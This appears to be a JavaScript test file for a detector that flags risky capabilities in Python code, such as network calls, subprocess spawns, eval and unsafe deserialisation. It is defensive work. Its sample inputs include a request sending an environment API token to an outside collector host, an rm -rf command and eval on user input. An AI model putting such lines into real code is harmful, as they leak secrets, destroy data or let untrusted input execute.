import test from 'node:test';
import assert from 'node:assert/strict';
import { detectPyCapability } from '../dist/detectors/py-capability.js';

function line(file, content, lineNumber = 1) {
  return { file, line: lineNumber, content };
}

test('py: requests.get with literal URL flags external fetch', () => {
  const findings = detectPyCapability([
    line('agent.py', 'resp = requests.get("https://api.example.com/v1/things")')
  ]);
  assert.ok(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'));
});

test('py: external request with env secret flags source secret exfiltration', () => {
  const findings = detectPyCapability([
    line(
      'agent.py',
      'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + os.environ["API_TOKEN"]})'
    )
  ]);

  assert.ok(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'));
  const f = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
  assert.ok(f);
  assert.equal(f.severity, 'high');
  assert.equal(f.surface, 'source');
});

test('py: requests.get without literal URL does not over-fire', () => {
  const findings = detectPyCapability([
    line('agent.py', 'resp = requests.get(url, headers=h)')
  ]);
  assert.equal(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'), undefined);
});

test('py: urllib.request.urlopen counts as external fetch', () => {
  const findings = detectPyCapability([
    line('agent.py', 'from urllib.request import urlopen; r = urlopen("https://x.example/y")')
  ]);
  assert.ok(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'));
});

test('py: subprocess.Popen flags as high', () => {
  const findings = detectPyCapability([
    line('agent.py', 'subprocess.Popen(["ls", "-la"], shell=False)')
  ]);
  const f = findings.find((finding) => finding.kind === 'capability_echo.subprocess_spawn_added');
  assert.ok(f);
  assert.equal(f.severity, 'high');
});

test('py: os.system flags subprocess spawn', () => {
  const findings = detectPyCapability([
    line('agent.py', 'os.system("rm -rf /tmp/cache")')
  ]);
  assert.ok(findings.find((f) => f.kind === 'capability_echo.subprocess_spawn_added'));
});

test('py: eval() flags as critical dynamic exec', () => {
  const findings = detectPyCapability([
    line('agent.py', 'result = eval(user_input)')
  ]);
  const f = findings.find((finding) => finding.kind === 'capability_echo.dynamic_eval_added');
  assert.ok(f);
  assert.equal(f.severity, 'critical');
});

test('py: importlib.import_module flags as dynamic exec', () => {
  const findings = detectPyCapability([
    line('agent.py', 'mod = importlib.import_module(name)')
  ]);
  assert.ok(findings.find((f) => f.kind === 'capability_echo.dynamic_eval_added'));
});

test('py: pickle.loads flags as unsafe deserialize', () => {
  const findings = detectPyCapability([
    line('agent.py', 'obj = pickle.loads(payload)')
  ]);
  const f = findings.find((finding) => finding.kind === 'capability_echo.unsafe_deserialize_added');
  assert.ok(f);
  assert.equal(f.severity, 'critical');
});

test('py: yaml.load without SafeLoader flags; yaml.safe_load does not', () => {
  const unsafe = detectPyCapability([
    line('agent.py', 'config = yaml.load(open("config.yml"))')
  ]);
  assert.ok(unsafe.find((f) => f.kind === 'capability_echo.unsafe_deserialize_added'));

  const safe = detectPyCapability([
    line('agent.py', 'config = yaml.safe_load(open("config.yml"))')
  ]);
  assert.equal(safe.find((f) => f.kind === 'capability_echo.unsafe_deserialize_added'), undefined);
});

test('py: comment lines are ignored', () => {
  const findings = detectPyCapability([
    line('agent.py', '# requests.get("https://example.com")')
  ]);
  assert.equal(findings.length, 0);
});

test('py: test file downgrades severity', () => {
  const findings = detectPyCapability([
    line('tests/test_agent.py', 'subprocess.Popen(["echo", "test"])')
  ]);
  const f = findings.find((finding) => finding.kind === 'capability_echo.subprocess_spawn_added');
  assert.ok(f);
  assert.equal(f.severity, 'low');
});
